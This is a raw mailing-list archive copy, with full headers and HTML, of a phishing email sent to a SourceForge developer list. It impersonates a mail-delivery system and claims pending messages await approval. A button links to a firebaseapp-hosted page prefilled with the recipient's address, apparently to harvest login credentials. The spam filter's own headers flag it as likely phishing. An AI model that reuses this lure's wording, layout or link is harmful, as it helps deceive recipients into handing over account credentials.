Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id CD97237BC5E
	for <lists+industrypack-devel@lfdr.de>; Wed, 12 May 2021 14:19:13 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.92.3)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1lgnpX-0007dr-9D
	for lists+industrypack-devel@lfdr.de; Wed, 12 May 2021 12:19:11 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 (envelope-from <postmaster@kipenann.com>) id 1lgnpV-0007dj-Pv
 for industrypack-devel@lists.sourceforge.net; Wed, 12 May 2021 12:19:09 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=kqySbc2v/j9eX2KdMzhHlXIg035W2oidcP79at6wpgY=; b=QMtCwRvYFJAbnbeDDK0TErjJtY
 Uame2OWhXmWO85TkWUItkJ8aEJMlwaGbFzaaX7FrnIyjEZblu7CftKRXFkRw/PggAUhMCO/0+OGYd
 B5VJ4xDnZK78tLDbMecU+jgMm/kNY5ZpCgXLOfgmFtpKgjA++e/+ITm9NjN3SJN6JpRU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=kqySbc2v/j9eX2KdMzhHlXIg035W2oidcP79at6wpgY=; b=K
 yB0FB/lHVHo09IQiW3StT3n3nMvZ4lvnaNkhVvjUf1iqcpamkbYbrXzaAz5wl2nkihTm53lYWChsn
 qzLjM/f0K41yKRnTxUbKeeT5QRotPntgpH2JzQsrVZ4O9opaq0gvujKLKuq1WdgswK+ivwXjLunxc
 4miKM2Udgo7IV2qc=;
Received: from ja.javawidget.live ([5.180.123.3])
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
 id 1lgnpM-005NZ0-Qj
 for industrypack-devel@lists.sourceforge.net; Wed, 12 May 2021 12:19:10 +0000
From: Email Admin<postmaster@kipenann.com>
To: industrypack-devel@lists.sourceforge.net
Date: 12 May 2021 04:58:46 -0700
Message-ID: <20210512045846.67BF51DE0C6D9256@kipenann.com>
MIME-Version: 1.0
X-Spam-Score: 7.0 (+++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 1.9 URIBL_ABUSE_SURBL Contains an URL listed in the ABUSE SURBL blocklist
 [URIs: lorika.firebaseapp.com]
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: lorika.firebaseapp.com]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 MIME_HTML_MOSTLY       BODY: Multipart message mostly text/html MIME
 1.0 HTML_MESSAGE           BODY: HTML included in message
 3.0 URI_FIREBASEAPP        Link to hosted firebase web application, possible
 phishing
X-Headers-End: 1lgnpM-005NZ0-Qj
Subject: [Industrypack-devel] We detected 7 Undelivered-Pending Messages -
 Your Action Is Required
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============7279678334994582015=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net


--===============7279678334994582015==
Content-Type: multipart/alternative;
	boundary="----=_NextPart_000_0012_8122BF7D.89B626E7"


------=_NextPart_000_0012_8122BF7D.89B626E7
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable

Dear, industrypack-devel
------=_NextPart_000_0012_8122BF7D.89B626E7
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19963"></HEAD>
<BODY>
<DIV style=3D'FONT-SIZE: 17px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "S=
egoe UI Light", "Segoe WP Light", "Segoe UI", "Segoe WP", Segoe, Tahoma, "M=
icrosoft Sans Serif", Verdana, sans-serif, serif, EmojiFont; WHITE-SPACE: n=
ormal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
b(0,120,215); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PA=
DDING-LEFT: 0px; MARGIN: 0px 0px 10px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACIN=
G: normal; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px;=20
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-style: initial; text-decoration-color: initial; text-decoration-=
thickness: initial'>
<DIV style=3D"BORDER-TOP: 0px; POSITION: static !important; PADDING-TOP: 0p=
x; CLEAR: both"><FONT color=3D#000000>Dear industrypack-devel<BR></FONT><BR=
></DIV></DIV>
<DIV style=3D'FONT-SIZE: 12px; FONT-FAMILY: "Segoe UI", Tahoma; WHITE-SPACE=
: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
 rgb(102,102,102); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0p=
x; PADDING-LEFT: 0px; MARGIN: 0px 120px 30px 0px; ORPHANS: 2; WIDOWS: 2; LE=
TTER-SPACING: normal; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px; BACKGROUND-COL=
OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
t-variant-caps: normal; -webkit-text-stroke-width:=20
0px; text-decoration-style: initial; text-decoration-color: initial; text-d=
ecoration-thickness: initial'>
<SPAN style=3D'FONT-SIZE: 14px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (Wes=
t European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helve=
tica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
ORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: no=
rmal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: no=
rmal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-li=
gatures: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
tion-color: initial'>
This message was created automatically by mail delivery software. <SPAN sty=
le=3D'FONT-SIZE: 14px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West Europea=
n)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue=
", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORP=
HANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BAC=
KGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial'>Undelivered/Pending messages are awaiting your approval to be delivere=
d.<BR></SPAN></SPAN><BR><BR>
<A style=3D'FONT-SIZE: 14px; TEXT-DECORATION: none; FONT-FAMILY: "Segoe UI"=
, "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystem=
Font, Roboto, "Helvetica Neue", sans-serif; BACKGROUND: rgb(0,120,212); WHI=
TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
; COLOR: rgb(255,255,255); PADDING-BOTTOM: 10px; FONT-STYLE: normal; TEXT-A=
LIGN: left; PADDING-TOP: 10px; PADDING-LEFT: 10px; ORPHANS: 2; WIDOWS: 2; L=
ETTER-SPACING: normal; PADDING-RIGHT: 10px;=20
TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; border-radius: 2px' href=3D"https://lorik=
a.firebaseapp.com/01lorika.html#iuser=3Dindustrypack-devel@lists.sourceforg=
e.net" rel=3D"" target=3D_blank>View/Authorize Delivery for pending mails</=
A>
<SPAN style=3D'FONT-SIZE: 14px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (Wes=
t European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helve=
tica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
ORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: no=
rmal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; =
LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0p=
x; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
style: initial; text-decoration-color: initial'><SPAN>&nbsp;</SPAN></SPAN><=
BR><BR><BR><EM><FONT color=3D#838282 size=3D2>Message Encrypted by&nbsp;lis=
ts.sourceforge.net</FONT></EM>
<SPAN style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (Wes=
t European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helve=
tica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
ORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(131,130,130); FONT-STY=
LE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACI=
NG: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-vari=
ant-ligatures: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
tion-color: initial'>&nbsp;</SPAN>
<EM style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
M: none; FONT-WEIGHT: 400; COLOR: rgb(131,130,130); ORPHANS: 2; WIDOWS: 2; =
LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0p=
x; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-=
stroke-width: 0px; text-decoration-style: initial;=20
text-decoration-color: initial'>&copy; All Rights Reserved.</EM>
<SPAN style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (Wes=
t European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helve=
tica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
ORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(131,130,130); FONT-STY=
LE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACI=
NG: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-vari=
ant-ligatures: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
tion-color: initial'><SPAN>&nbsp;</SPAN>| If you do not wish to recieve thi=
s message</SPAN></DIV></BODY></HTML>
------=_NextPart_000_0012_8122BF7D.89B626E7--


--===============7279678334994582015==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7279678334994582015==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============7279678334994582015==--

